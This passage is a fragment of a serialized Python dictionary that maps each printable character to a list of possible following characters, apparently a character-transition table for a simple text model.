'9', ':', ';', '<', '=', '>', '@', 'X', '[', '\\', ']', '^', '`', 'x', '{', '|', '}', '~'], '#': ['1', '\t', '\n', '\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '"': ['\n', ' ', 'I', 'W', 'Y', 'T', 'A', 'S', 'M', 'D', 'H', 'N', 'O', 't', 'L', 'B', 'i', 'G', 'E', "'", 'w', 'F', 'P', 'a', 'C', 'y', 'b', '_', 'm', 's', '-', 'J', 'V', 'h', 'R', 'U', 'o', 'e', 'f', 'n', '?', 'K', 'Q', 'g', ';', 'd', 'k', 'l', 'r', '\t', '\r', '!', '"', '#', '$', '%', '&', '(', ')', '*', '+', ',', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', '<', '=', '>', '@', 'X', 'Z', '[', '\\', ']', '^', '`', 'c', 'j', 'p', 'q', 'u', 'v', 'x', 'z', '{', '|', '}', '~'], "'": ['s', 't', ' ', 'l', 'v', "'", 'm', 'r', 'd', 'I', 'W', 'Y', 'e', 'T', 'A', '\n', 'u', 'N', 'H', 'O', 'c', 'S', 'D', 'n', 'M', 'B', 'a', 'C', 'P', 'L', ',', 'y', 'G', '&', '-', 'i', 'w', 'o', 'E', 'R', 'b', 'F', 'h', 'p', 'J', '1', 'g', '.', 'V', '"', 'f', 'Q', ';', '?', 'K', 'U', '!', ')', '(', '>', 'j', 'q', '\t', '\r', '#', '$', '%', '*', '+', '/', '0', '2', '3', '4', '5', '6', '7', '8', '9', ':', '<', '=', '@', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'k', 'x', 'z', '{', '|', '}', '~'], '&': ['q', 'A', 'a', 'o', 'b', '#', 'n', 'c', 'l', 's', 'u', '\t', '\n', '\r', ' ', '!', '"', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'm', 'p', 'r', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], ')': [' ', ',', '\n', '.', ';', '&', '-', ':', 'S', '\t', '\r', '!', '"', '#', '$', '%', "'", '(', ')', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '(': ['a', 'i', 'w', 'h', 't', 's', 'I', 'f', 'M', 'o', 'p', 'm', 'n', 'L', 'T', 'c', 'N', 'P', 'V', 'b', 'l', 'y', 'A', 'C', 'B', 'E', 'D', 'H', 'O', 'S', '_', 'e', 'd', 'r', 'v', '\t', '\n', '\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'F', 'G', 'J', 'K', 'Q', 'R', 'U', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'g', 'j', 'k', 'q', 'u', 'x', 'z', '{', '|', '}', '~'], '*': ["'", '\t', '\n', '\r', ' ', '!', '"', '#', '$', '%', '&', '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '-': [' ', '-', 'a', 'b', 's', 't', 'c', 'm', 'w', 'l', 'h', 'r', 'p', 'd', 'f', 'e', 'g', 'o', 'i', 'n', '&', 'u', '\n', 'k', 'I', 'y', '"', "'", 'j', 'v', 'M', 'O', 'S', 'C', 'E', 'A', 'H', 'T', 'N', 'q', '!', '?', 'B', 'D', 'G', 'F', 'W', 'Z', '1', '>', 'L', 'P', '\t', '\r', '#', '$', '%', '(', ')', '*', '+', ',', '.', '/', '0', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '@', 'J', 'K', 'Q', 'R', 'U', 'V', 'X', 'Y', '[', '\\', ']', '^', '_', '`', 'x', 'z', '{', '|', '}', '~'], ',': [' ', '\n', '&', "'", '"', '0', 'I', 'A', 't', 'w', 'y', ',', 'B', 'F', 'd', 's', 'E', 'O', 'W', 'Y', 'b', 'h', 'l', 'o', '\t', '\r', '!', '#', '$', '%', '(', ')', '*', '+', '-', '.', '/', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'C', 'D', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'c', 'e', 'f', 'g', 'i', 'j', 'k', 'm', 'n', 'p', 'q', 'r', 'u', 'v', 'x', 'z', '{', '|', '}', '~'], '.': [' ', '&', '\n', "'", '"', 'T', 'A', 'S', 'B', 'H', 'I', 'M', 'W', '>', 'P', 'N', 'O', '.', ',', 'R', 'Y', 'J', 'D', 'F', 'L', ')', 'K', 'C', 'V', 'U', 'E', '-', 'G', '2', '?', 'p', '*', '1', 'Q', 'h', '\t', '\r', '!', '#', '$', '%', '(', '+', '/', '0', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '@', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '1': ['9', '8', '4', '6', '5', '7', ' ', '.', '3', '\n', '1', '0', '\t', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '2', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '0': ['0', ' ', ',', '\n', '2', '5', 't', '6', ';', '\t', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '.', '/', '1', '3', '4', '7', '8', '9', ':', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '3': ['0', ' ', ',', '.', '4', '5', '\t', '\n', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '1', '2', '3', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '2': [' ', ',', '0', '.', '5', '9', '\t', '\n', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '1', '2', '3', '4', '6', '7', '8', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '5': [' ', ',', '-', '.', '1', '0', '5', 't', ':', '\t', '\n', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '/', '2', '3', '4', '6', '7', '8', '9', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '4': ['0', ' ', '7', '.', '6', ';', '\n', ',', '\t', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '1', '2', '3', '4', '5', '8', '9', ':', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '7': [',', '7', ';', ' ', '.', '0', '2', '5', '6', '\t', '\n', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '1', '3', '4', '8', '9', ':', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '6': [',', ' ', ';', '9', '0', '\t', '\n', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '.', '/', '1', '2', '3', '4', '5', '6', '7', '8', ':', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '9': ['1', ' ', '2', '0', ',', '\t', '\n', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '.', '/', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '8': ['7', ',', '0', ' ', '.', '3', 't', '8', '\t', '\n', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '1', '2', '4', '5', '6', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], ';': [' ', '&', 'I', 'W', 'T', 'Y', 'A', 'O', 'N', 'B', 'M', 'H', '\n', 'S', 'D', 't', 'L', 'a', 'P', 'i', 'C', 'G', 'w', 'y', 'b', 'R', 's', 'F', 'J', 'h', 'E', 'K', '.', 'f', ';', ',', 'V', 'd', 'c', 'm', 'n', 'l', 'p', 'g', '>', 'e', 'r', 'U', 'k', 'u', 'o', 'Q', "'", '-', 'v', 'j', ')', '4', 'q', '!', '(', '2', 'Z', '_', '\t', '\r', '"', '#', '$', '%', '*', '+', '/', '0', '1', '3', '5', '6', '7', '8', '9', ':', '<', '=', '?', '@', 'X', '[', '\\', ']', '^', '`', 'x', 'z', '{', '|', '}', '~'], ':': [' ', '&', '\n', "'", 'I', '-', 'T', 'D', 'E', 'G', 'H', 'K', 'u', '\t', '\r', '!', '"', '#', '$', '%', '(', ')', '*', '+', ',', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'F', 'J', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '?': [' ', '&', '"', "'", '\n', '-', 'T', 'S', 'I', 'W', 'A', 'B', 'D', 'F', 'M', 'N', 'P', '_', ')', 'G', 'H', 'J', 'L', 'O', 'R', 'Y', 'd', '\t', '\r', '!', '#', '$', '%', '(', '*', '+', ',', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'C', 'E', 'K', 'Q', 'U', 'V', 'X', 'Z', '[', '\\', ']', '^', '`', 'a', 'b', 'c', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '>': ['\n', '\t', '\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'A': ['n', 'l', ' ', 'u', 't', 's', 'h', 'r', 'f', 'm', 'y', 'g', 'N', 'L', 'p', 'R', 'b', '\n', 'T', 'c', 'd', 'S', 'w', 'V', 'D', '.', 'M', 'B', 'K', 'P', 'C', 'G', 'F', 'U', 'W', "'", 'I', 'Y', ',', '1', 'a', 'i', 'j', 'v', 'z', '\t', '\r', '!', '"', '#', '$', '%', '&', '(', ')', '*', '+', '-', '/', '0', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'E', 'H', 'J', 'O', 'Q', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'e', 'k', 'o', 'q', 'x', '{', '|', '}', '~'], 'C': ['o', 'a', 'h', 'e', 'l', 'r', 'A', 'O', 'E', 'i', 'u', ' ', 'I', '3', 'T', 'H', 'R', '2', 'y', '\n', '&', ',', '.', 'K', 'L', 'S', 'U', 'Y', '\t', '\r', '!', '"', '#', '$', '%', "'", '(', ')', '*', '+', '-', '/', '0', '1', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'C', 'D', 'F', 'G', 'J', 'M', 'N', 'P', 'Q', 'V', 'W', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'j', 'k', 'm', 'n', 'p', 'q', 's', 't', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'B': ['u', 'a', 'e', 'o', 'r', 'i', 'l', 'y', 'E', 'L', 'U', '.', 'S', ' ', 'O', 'R', 'Y', ',', '\t', '\n', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'F', 'G', 'H', 'I', 'J', 'K', 'M', 'N', 'P', 'Q', 'T', 'V', 'W', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'm', 'n', 'p', 'q', 's', 't', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'E': ['m', 'n', 'v', ' ', 'l', 'u', 'R', 'a', 'S', 'D', 'L', 'N', 'E', 'h', 'x', 'A', 'V', '.', 'g', 'M', 'd', '!', ',', 'i', 'I', 't', 'T', 'Y', 's', '\n', '?', 'C', 'r', 'f', 'O', 'W', 'X', 'B', 'G', 'F', 'K', 'P', 'c', 'q', 'p', 'y', '\t', '\r', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'H', 'J', 'Q', 'U', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'e', 'j', 'k', 'o', 'w', 'z', '{', '|', '}', '~'], 'D': ['o', 'e', 'a', 'i', 'r', ' ', 'u', 'O', 'E', 'I', '.', 'N', ',', 'A', 'S', '\n', "'", 'D', 'R', 'U', 'y', 'L', '\t', '\r', '!', '"', '#', '$', '%', '&', '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'C', 'F', 'G', 'H', 'J', 'K', 'M', 'P', 'Q', 'T', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 's', 't', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'G': ['l', 'o', 'e', 'r', 'u', 'i', 'a', '.', ' ', 'E', 'H', '!', ',', 'h', 'A', 'I', 'O', 'G', 'N', 'S', 'R', 'U', '\t', '\n', '\r', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'C', 'D', 'F', 'J', 'K', 'L', 'M', 'P', 'Q', 'T', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'j', 'k', 'm', 'n', 'p', 'q', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'F': ['r', 'o', 'a', 'i', 'l', 'e', 'u', 'E', 'O', 'I', ' ', 'A', 'R', 'U', 'T', 'F', '\n', '.', '\t', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'C', 'D', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'P', 'Q', 'S', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'm', 'n', 'p', 'q', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'I': [' ', 't', "'", 'n', '\n', 'f', 's', 'N', '?', 'S', ',', 'T', 'd', 'r', 'w', 'c', 'm', 'E', 'D', 'V', 'L', 'R', '.', 'l', 'C', 'G', '_', 'k', 'O', 'a', 'g', 'h', 'F', '!', 'A', 'B', 'M', 'b', 'v', '-', 'I', 'P', 'o', ';', 'K', 'Q', 'X', 'e', '\t', '\r', '"', '#', '$', '%', '&', '(', ')', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', '<', '=', '>', '@', 'H', 'J', 'U', 'W', 'Y', 'Z', '[', '\\', ']', '^', '`', 'i', 'j', 'p', 'q', 'u', 'x', 'y', 'z', '{', '|', '}', '~'], 'H': ['e', 'a', 'o', 'i', 'E', 'u', 'A', 'I', 'O', 'T', ' ', 'y', 'R', 'm', 'Y', '.', 'Q', 'U', '\t', '\n', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'P', 'S', 'V', 'W', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'K': ['a', 'e', 'i', 'N', 'E', 'n', ' ', 'I', 'r', '.', ',', 'S', '\t', '\n', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'O', 'P', 'Q', 'R', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'o', 'p', 'q', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'J': ['a', 'e', 'u', 'o', 'i', '.', 'A', 'U', '\t', '\n', '\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'M': ['r', 'a', 'i', 'o', 'y', 'u', 'e', 'E', 'A', ' ', 'U', 'O', '.', 'I', 'P', 'L', 'B', 'Y', '-', ',', 'S', 'c', 'm', '\t', '\n', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'M', 'N', 'Q', 'R', 'T', 'V', 'W', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'n', 'p', 'q', 's', 't', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'L': ['u', 'o', 'a', 'e', 'i', 'L', ' ', 'I', 'E', 'O', 'D', 'Y', ',', 'M', 'l', 'F', 'U', 'T', '.', 'A', 'S', 'C', '\n', '!', "'", '?', 'K', 'W', '\t', '\r', '"', '#', '$', '%', '&', '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'B', 'G', 'H', 'J', 'N', 'P', 'Q', 'R', 'V', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'O': ['h', 'n', 'g', 'f', 'r', 'U', 'u', 'N', 'l', ' ', 'T', 'W', 'R', 'M', 't', 'L', 'x', 'c', 'V', '!', 'v', 'E', 'S', 'O', 'b', 'w', '\n', '.', 'K', 'p', ',', 'B', 'P', 'd', 'F', 'I', 'A', 'G', 'Y', 's', '\t', '\r', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'C', 'D', 'H', 'J', 'Q', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'e', 'i', 'j', 'k', 'm', 'o', 'q', 'y', 'z', '{', '|', '}', '~'], 'N': ['o', 'e', 'a', 'G', 'O', 'E', "'", 'T', ' ', 'D', 'i', 'C', 'S', '.', ',', 'A', 'I', 'Y', '\n', 'N', 'V', '!', 'K', '?', 'B', 'R', 'W', 'u', '\t', '\r', '"', '#', '$', '%', '&', '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'F', 'H', 'J', 'L', 'M', 'P', 'Q', 'U', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'Q': ['u', 'U', 'c', '\t', '\n', '\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'P': ['h', 'u', 'e', 'o', 'a', 'r', 'l', 'i', 's', 'E', 'I', 'O', '.', 'P', 'L', 'y', 'A', 'U', ' ', 'H', 'S', 'R', '\t', '\n', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'C', 'D', 'F', 'G', 'J', 'K', 'M', 'N', 'Q', 'T', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'j', 'k', 'm', 'n', 'p', 'q', 't', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'S': ['h', 'o', 't', 'u', 'a', 'i', 'y', 'e', ' ', 'c', 'p', 'T', 'E', 'S', 'O', 'w', 'H', '.', 'l', 'I', 'P', 'A', 'm', '\n', ',', 'C', 'N', 'U', 'q', 'L', 'k', 'n', 'W', '?', 'Y', '\t', '\r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'B', 'D', 'F', 'G', 'J', 'K', 'M', 'Q', 'R', 'V', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'd', 